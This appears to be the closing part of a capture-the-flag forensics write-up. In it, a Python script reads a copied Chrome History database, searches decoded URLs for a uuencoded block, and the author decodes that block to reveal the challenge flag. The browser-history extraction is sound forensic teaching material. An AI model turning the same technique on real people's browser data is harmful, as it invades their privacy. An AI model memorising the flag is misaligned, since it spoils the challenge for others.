<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sqlite3</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">extract_chrome_history</span><span class="p">(</span><span class="n">history_path</span><span class="p">):</span>
    <span class="kn">import</span> <span class="nn">shutil</span>
    <span class="n">temp_db</span> <span class="o">=</span> <span class="s">"temp_chrome_history.db"</span>
    <span class="n">shutil</span><span class="p">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">history_path</span><span class="p">,</span> <span class="n">temp_db</span><span class="p">)</span>
    
    <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">temp_db</span><span class="p">)</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"""
        SELECT
            urls.url,
            urls.title,
            urls.visit_count,
            urls.last_visit_time,
            visits.visit_time,
            visits.from_visit
        FROM urls
        LEFT JOIN visits ON urls.id = visits.url
        ORDER BY urls.last_visit_time DESC
    """</span><span class="p">)</span>
    
    <span class="n">history</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    
    <span class="k">print</span><span class="p">(</span><span class="s">"=== Extracted Content from Chrome History ==="</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">history</span><span class="p">[:</span><span class="mi">50</span><span class="p">]:</span>
        <span class="n">url</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">visit_count</span><span class="p">,</span> <span class="n">last_visit_time</span><span class="p">,</span> <span class="n">visit_time</span><span class="p">,</span> <span class="n">from_visit</span> <span class="o">=</span> <span class="n">entry</span>
        
        <span class="n">decoded_url</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">if</span> <span class="n">url</span> <span class="k">else</span> <span class="s">""</span>
        <span class="n">decoded_title</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">title</span><span class="p">)</span> <span class="k">if</span> <span class="n">title</span> <span class="k">else</span> <span class="s">""</span>
        
        <span class="n">begin_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"begin 664 -(.*?)end"</span>
        <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">begin_pattern</span><span class="p">,</span> <span class="n">decoded_url</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="n">matches</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">match</span> <span class="ow">in</span> <span class="n">matches</span><span class="p">:</span>
                <span class="n">extracted_content</span> <span class="o">=</span> <span class="n">match</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">extracted_content</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
                    <span class="k">print</span><span class="p">(</span><span class="n">extracted_content</span><span class="p">)</span>
    
    <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">temp_db</span><span class="p">)</span>

<span class="n">history_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"History"</span>
<span class="n">extract_chrome_history</span><span class="p">(</span><span class="n">history_path</span><span class="p">)</span>
</code></pre></div></div>

<p>And then just going online to find UUEncode Decoder and we get the flag:</p>

<p>“L96-H;R!F;&amp;%G&gt;S8Y,C<code class="language-plaintext highlighter-rouge">P8S$S9&amp;-B,SED93$Y830P-64Y9#%F.3DS.#(Q?0H</code>”</p>

<p>which when UUDecoded is:</p>

<p><code class="language-plaintext highlighter-rouge">echo flag{69200c13dcb39de19a405e9d1f993821}</code></p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="misc" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry></feed>